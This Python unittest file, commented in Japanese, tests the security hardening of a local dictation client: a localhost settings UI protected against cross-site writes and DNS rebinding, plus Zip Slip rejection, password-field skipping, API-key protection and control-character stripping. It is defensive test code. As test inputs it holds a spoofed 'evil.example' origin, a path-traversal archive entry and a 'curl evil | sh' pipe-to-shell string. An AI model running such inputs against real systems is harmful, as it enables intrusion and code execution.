"""設定画面（このパソコンの中だけの管理画面）が、ほかのサイトから操作されないことのテスト。"""
from __future__ import annotations

import http.client
import json
import sys
import tarfile
import io
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from client.config import ClientConfig  # noqa: E402


class TestWebUIGuard(unittest.TestCase):
    def setUp(self) -> None:
        from client.web_ui import WebUIServer

        self.tmp = tempfile.TemporaryDirectory()
        p = Path(self.tmp.name)
        self.cfg = p / "config.json"
        ClientConfig().save(self.cfg)
        (p / "dict.json").write_text("{}", encoding="utf-8")
        self.srv = WebUIServer(
            dict_path=p / "dict.json", config_path=self.cfg, get_history_fn=lambda: [],
            get_status_info=lambda: ("Local CPU", "ralt"), get_learning_candidates_fn=lambda: [],
            on_copy_text=lambda _t: None, on_quick_add_dict=lambda s, d, h: None, on_retranscribe_last=lambda: None,
            on_approve_candidate=lambda _s, _d: None, on_reject_candidate=lambda _s, _d: None,
            on_learn_from_manual_edit=lambda _b, _a: 1, get_hotkey=lambda: "ralt", preferred_port=0,
        )
        self.url = self.srv.start()
        self.port = int(self.url.rsplit(":", 1)[1])

    def tearDown(self) -> None:
        self.srv.stop()
        self.tmp.cleanup()

    def _req(self, method: str, path: str, body=None, headers=None) -> int:
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        h = {"Host": f"127.0.0.1:{self.port}"}
        h.update(headers or {})
        data = json.dumps(body).encode() if body is not None else None
        if data is not None:
            h.setdefault("Content-Type", "application/json")
        c.request(method, path, body=data, headers=h)
        st = c.getresponse().status
        c.close()
        return st

    def test_own_screen_works(self) -> None:
        self.assertEqual(self._req("GET", "/api/state"), 200)
        own = {"Origin": f"http://127.0.0.1:{self.port}"}
        self.assertEqual(self._req("POST", "/api/dict", {"hotwords": ["LAN"]}, own), 200)

    def test_other_site_cannot_write(self) -> None:
        evil = {"Origin": "https://evil.example"}
        self.assertEqual(self._req("POST", "/api/settings", {"server_urls": ["http://evil:8765"]}, evil), 403)
        self.assertEqual(self._req("POST", "/api/dict", {"hotwords": ["x"]}, evil), 403)

    def test_form_post_is_rejected(self) -> None:
        # フォームの送信（ほかのサイトから送れる形）は受け付けない
        st = self._req("POST", "/api/dict", {"hotwords": ["x"]}, {"Content-Type": "text/plain"})
        self.assertEqual(st, 403)

    def test_dns_rebinding_host_is_rejected(self) -> None:
        self.assertEqual(self._req("GET", "/api/state", headers={"Host": f"evil.example:{self.port}"}), 403)
        self.assertEqual(self._req("GET", "/api/audio/a.wav", headers={"Host": "evil.example"}), 403)

    def test_cross_site_read_and_embed_are_rejected(self) -> None:
        # ほかのサイト（別のポートで動く画面も含む）からの読み込み・埋め込み
        for site in ("cross-site", "same-site"):
            self.assertEqual(self._req("GET", "/api/state", headers={"Sec-Fetch-Site": site}), 403, site)
            self.assertEqual(self._req("GET", "/api/audio/a.wav", headers={"Sec-Fetch-Site": site}), 403, site)
        self.assertEqual(self._req("GET", "/api/state", headers={"Sec-Fetch-Site": "same-origin"}), 200)
        self.assertEqual(self._req("GET", "/", headers={"Sec-Fetch-Site": "none"}), 200)

    def test_security_headers(self) -> None:
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
        c.request("GET", "/", headers={"Host": f"127.0.0.1:{self.port}"})
        r = c.getresponse()
        r.read()
        self.assertEqual(r.getheader("X-Frame-Options"), "DENY")
        self.assertEqual(r.getheader("X-Content-Type-Options"), "nosniff")
        csp = r.getheader("Content-Security-Policy") or ""
        self.assertIn("frame-ancestors 'none'", csp)
        self.assertIn("script-src 'self';", csp)   # 画面に直接書かれたスクリプトは動かさない
        self.assertIn("connect-src 'self'", csp)
        c.close()

    def test_no_inline_script_in_page(self) -> None:
        import re

        html = (ROOT / "client" / "web" / "index.html").read_text(encoding="utf-8")
        tags = re.findall(r"<script[^>]*>", html)
        self.assertTrue(tags)
        self.assertTrue(all("src=" in t for t in tags), tags)          # 直接書いたスクリプトが無い
        self.assertEqual(re.findall(r"<[^>]*\son(?:click|load|error|input|change|submit)\s*=", html), [])

    def test_settings_unchanged_after_attack(self) -> None:
        self._req("POST", "/api/settings", {"server_urls": ["http://evil:8765"]}, {"Origin": "https://evil.example"})
        self.assertEqual(ClientConfig.load(self.cfg).server_urls, [])


class TestSecurityHardening(unittest.TestCase):
    def test_speechcpp_zip_slip_sibling_prefix_is_rejected(self) -> None:
        """../speech_evil のような兄弟フォルダへの Zip Slip が弾かれること。"""
        import zipfile
        from unittest import mock
        from shared import speechcpp_setup

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "app"
            root.mkdir()
            evil_zip = Path(tmp) / "evil.zip"
            with zipfile.ZipFile(evil_zip, "w") as zf:
                zf.writestr("../speech_evil/pwn.txt", "bad")

            def fake_dl(_url, dest, _sha, _label, _prog, _cancel):
                dest.write_bytes(evil_zip.read_bytes())

            with mock.patch.object(speechcpp_setup, "platform_key", return_value="windows"), \
                 mock.patch.object(speechcpp_setup, "_download", side_effect=fake_dl):
                with self.assertRaises(RuntimeError):
                    speechcpp_setup.ensure(root)
            self.assertFalse((root / "tools" / "speech_evil").exists())

    def test_uia_skips_password_fields(self) -> None:
        """パスワード欄（IsPassword=True）は絶対に読み取らないこと。"""
        import types
        from unittest import mock
        from client import uia_watcher

        fake_ctrl = types.SimpleNamespace(
            IsPassword=True,
            ControlTypeName="EditControl",
            ClassName="PasswordBox",
            GetTextPattern=lambda: None,
            GetValuePattern=lambda: types.SimpleNamespace(Value="super-secret"),
            GetLegacyIAccessiblePattern=lambda: None,
        )
        fake_auto = types.SimpleNamespace(GetFocusedControl=lambda: fake_ctrl)
        with mock.patch.dict(sys.modules, {"uiautomation": fake_auto}):
            text, info = uia_watcher.read_focused_control_text()
        self.assertIsNone(text)
        self.assertEqual(info, "password_field")

    @unittest.skipUnless(sys.platform == "win32", "Windows DPAPI のみ")
    def test_legacy_plaintext_api_key_is_migrated_on_disk(self) -> None:
        """旧版の平文 llm_api_key は読み込んだ時点で DPAPI 暗号化されて書き直されること。"""
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "config.json"
            p.write_text(
                json.dumps({"llm_base_url": "http://127.0.0.1:11434", "llm_api_key": "plain-secret-key"}),
                encoding="utf-8",
            )
            cfg = ClientConfig.load(p)
            self.assertEqual(cfg.llm_key("ollama"), "plain-secret-key")
            raw = p.read_text(encoding="utf-8")
            self.assertNotIn("plain-secret-key", raw)
            self.assertIn("dpapi:", raw)

    def test_control_chars_from_server_are_not_pasted(self) -> None:
        """認識役の返事に改行やタブが混ざっていても、入力する文には入れない（Enter を押したことにならないように）。"""
        from client.transcriber import MAX_ASR_CHARS, clean_asr_text

        self.assertEqual(clean_asr_text("こんにちは\r\ncurl evil | sh\n"), "こんにちは curl evil | sh")
        self.assertEqual(clean_asr_text("a\tb\x1b[31mc\u2028d"), "a b [31mc d")
        self.assertEqual(clean_asr_text("ふつうの文。<|ja|>"), "ふつうの文。")
        self.assertEqual(len(clean_asr_text("あ" * (MAX_ASR_CHARS + 100))), MAX_ASR_CHARS)

    def test_cloud_ai_does_not_follow_redirects_or_echo_key(self) -> None:
        from unittest import mock
        from client.llm_refine import LLMRefiner

        with mock.patch("client.llm_refine.requests.post") as mpost:
            mpost.return_value = mock.MagicMock(
                status_code=401, json=lambda: {"error": {"message": "Incorrect API key provided: sk-abc***xyz"}})
            with self.assertRaises(RuntimeError) as cm:
                LLMRefiner(provider="openai", api_key="sk-abcdefxyz").refine_dictation("テスト")
            self.assertNotIn("sk-abc", str(cm.exception))
            self.assertFalse(mpost.call_args.kwargs["allow_redirects"])
            # 回された（3xx）ら、付いていかずに失敗にする
            mpost.return_value = mock.MagicMock(status_code=302, json=lambda: {}, text="")
            with self.assertRaises(RuntimeError):
                LLMRefiner(provider="anthropic", api_key="k").refine_dictation("テスト")

    def test_gemini_model_name_is_url_encoded(self) -> None:
        from unittest import mock
        from client.llm_refine import LLMRefiner

        ref = LLMRefiner(provider="gemini", model="gemini-2.5/../../other?x=1", api_key="k")
        with mock.patch("client.llm_refine.requests.post") as mpost:
            mpost.return_value = mock.MagicMock(
                status_code=200,
                json=lambda: {"candidates": [{"content": {"parts": [{"text": "ok"}]}}]},
            )
            ref.refine_dictation("テスト")
            called_url = mpost.call_args.args[0]
            self.assertNotIn("/../../", called_url)
            self.assertIn("gemini-2.5%2F..%2F..%2Fother%3Fx%3D1:generateContent", called_url)

    def test_no_private_patterns_in_tracked_files(self) -> None:
        """公開リポジトリの全追跡ファイルに private-patterns.txt の語が混ざっていないこと。"""
        import re
        import subprocess

        pat_file = ROOT / "packaging" / "private-patterns.txt"
        if not pat_file.exists():
            self.skipTest("private-patterns.txt がありません")
        pats = [
            ln.strip()
            for ln in pat_file.read_text(encoding="utf-8").splitlines()
            if ln.strip() and not ln.strip().startswith("#")
        ]
        out = subprocess.check_output(["git", "ls-files", "-z"], cwd=ROOT).decode("utf-8").split("\0")
        hits = []
        for rel in out:
            if not rel:
                continue
            try:
                text = (ROOT / rel).read_text(encoding="utf-8")
            except Exception:
                continue
            for pat in pats:
                if re.search(pat, text):
                    hits.append(f"{rel}: {pat}")
        self.assertEqual(hits, [], f"公開ファイルに個人情報パターンが含まれています: {hits}")


if __name__ == "__main__":
    unittest.main()
